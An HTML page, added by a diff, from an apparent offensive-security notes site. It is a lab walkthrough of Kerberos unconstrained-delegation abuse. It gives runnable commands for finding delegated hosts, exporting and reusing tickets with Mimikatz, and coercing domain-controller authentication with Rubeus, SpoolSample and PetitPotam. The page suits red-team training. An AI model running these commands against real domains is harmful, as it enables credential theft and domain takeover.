@@ -1,0 +1,134 @@
+<!DOCTYPE html>
+<html lang="en-US">
+
+<head>
+  <title>offsecvault - Knowledge Base</title>
+  <!--------------------->
+  <!-- b0ydC owned. -->
+  <!-- --------------- -->
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta charset="utf-8" />
+
+  <style>
+    body {
+      font-size: 12px;
+      font-family: ubuntu mono;
+      background-color: white;
+      color: black;
+      margin: 0;
+    }
+
+    a {
+      color: black;
+      font-weight: bold;
+      text-decoration: none;
+    }
+
+    a:hover,
+    a:active {
+      color: #868686;
+      text-decoration: underline;
+    }
+    table, th, td {
+    border: 1px solid black;
+    border-collapse: collapse;
+    }
+
+    table.center {
+    margin-left: auto; 
+    margin-right: auto;
+}
+    
+  </style>
+</head>
+
+<body>
+  <pre><center>
+<a href="/index.html" style="text-decoration:none;">
+ ▒█████    █████▒ █████▒ ██████ ▓█████  ▄████▄ ██▒   █▓ ▄▄▄       █    ██  ██▓  ▄▄▄█████▓
+▒██▒  ██▒▓██   ▒▓██   ▒▒██    ▒ ▓█   ▀ ▒██▀ ▀█▓██░   █▒▒████▄     ██  ▓██▒▓██▒  ▓  ██▒ ▓▒
+▒██░  ██▒▒████ ░▒████ ░░ ▓██▄   ▒███   ▒▓█    ▄▓██  █▒░▒██  ▀█▄  ▓██  ▒██░▒██░  ▒ ▓██░ ▒░
+▒██   ██░░▓█▒  ░░▓█▒  ░  ▒   ██▒▒▓█  ▄ ▒▓▓▄ ▄██▒▒██ █░░░██▄▄▄▄██ ▓▓█  ░██░▒██░  ░ ▓██▓ ░ 
+░ ████▓▒░░▒█░   ░▒█░   ▒██████▒▒░▒████▒▒ ▓███▀ ░ ▒▀█░   ▓█   ▓██▒▒▒█████▓ ░██████▒▒██▒ ░ 
+░ ▒░▒░▒░  ▒ ░    ▒ ░   ▒ ▒▓▒ ▒ ░░░ ▒░ ░░ ░▒ ▒  ░ ░ ▐░   ▒▒   ▓▒█░░▒▓▒ ▒ ▒ ░ ▒░▓  ░▒ ░░   
+  ░ ▒ ▒░  ░      ░     ░ ░▒  ░ ░ ░ ░  ░  ░  ▒    ░ ░░    ▒   ▒▒ ░░░▒░ ░ ░ ░ ░ ▒  ░  ░    
+░ ░ ░ ▒   ░ ░    ░ ░   ░  ░  ░     ░   ░           ░░    ░   ▒    ░░░ ░ ░   ░ ░   ░      
+    ░ ░                      ░     ░  ░░ ░          ░        ░  ░   ░         ░  ░       
+                                       ░           ░                                     
+</a></pre>
+
+<div style="font-size:24px; text-align:center; font-family:courier,monospace;">
+    <a href="../../RED-TEAM.html">OFFENSIVE</a> |
+    <a href="../../BLUE-TEAM.html">DEFENSIVE</a> |
+    <a href="../../CTF.html">CTF</a> |
+    <a href="../../TOOLS.html">TOOLS</a> |
+    <a href="../../ABOUT.html">ABOUT</a> 
+</div>
+<pre style="text-align:center;">
+<h3> PRIVESC - KERBEROS DELEGATION </h3>
+
+allows to "reuse the end-user credentials to access resources hosted on a different server"
+
+GENERAL/BASIC OR UNCONSTRAINED DELEGATION: which allows the first hop server to request access
+to any service on any computer in the domain.
+
+>>> When unconstrained delegation is enabled, the DC places user's TGT inside TGS (Step 4 in the previous diagram). 
+When presented to the server with unconstrained delegation, the TGT is extracted from TGS and stored in LSASS. 
+This way the server can reuse the user's TGT to access any other resource as the user
+
+<b>::: Discover domain computers which have unconstrained delegation enabled usingPowerView</b>
+
+PS> Get-DomainComputer -UnConstrained
+
+<b>::: USING ActiveDirectory MODULE</b>
+
+PS> Get-ADComputer -Filter {TrustedForDelegation -eq $True}
+
+PS> Get-ADUser -Filter {TrustedForDelegation -eq $True}
+
+- Compromise the server(s) where Unconstrained delegation is enabled.
+- We must trick or wait for a domain admin to connect a service on appsrv.
+
+Now, if the command is run again
+
+PS> Invoke-Mimikatz –Command '"sekurlsa::tickets /export"'
+
+The DA token could be reused
+
+PS> Invoke-Mimikatz -Command '"kerberos::pttC:\Users\appadmin\Documents\user1\[0;2ceb8b3]-2-0-60a10000-Administrator@krbtgt-DOLLARCORP.MONEYCORP.LOCAL.kirbi"'
+
+<b>::: PRINTER BUG</b>
+
+A feature of MS-RPRN which allows any domain user (Authenticated User) can force any machine (running the Spooler service) to 
+connect to second a machine of the domain user's choice.
+
+We can capture the TGT of dcorp-dc$ by using Rubeus (https://github.com/GhostPack/Rubeus) on dcorp-appsrv
+
+PS> Rubeus.exe monitor /interval:5 /nowrap
+
+And after that run MS-RPRN.exe (https://github.com/leechristensen/SpoolSample) on the student VM
+
+PS> MS-RPRN.exe \\dcorp-dc.dollarcorp.moneycorp.local  \\dcorp-appsrv.dollarcorp.moneycorp.local
+
+<b>::: PETIPOTAM</b>
+
+We can also use PetitPotam.exe (https://github.com/topotam/PetitPotam) on dcorp-appsrv
+
+PS> PetitPotam.exe dcorp-appsrv dcorp-dc
+
+On dcorp-appsrv
+
+PS> Rubeus.exe monitor /interval:5
+
+""PetitPotamuses EfsRpcOpenFileRawfunction of MS-EFSRPC (Encrypting File System Remote Protocol) protocol and doesn't 
+need credentials when used against a DC""
+ 
+CONSTRAINED DELEGATION: which allows the first hop server (web server in our example) to request access only to 
+specified services on specified computers. If the user is not using Kerberos authentication to authenticate to the first 
+hop server, Windows offers Protocol Transition to transition the request to Kerberos
+
+
+
+</center>
+</body>
+</html>
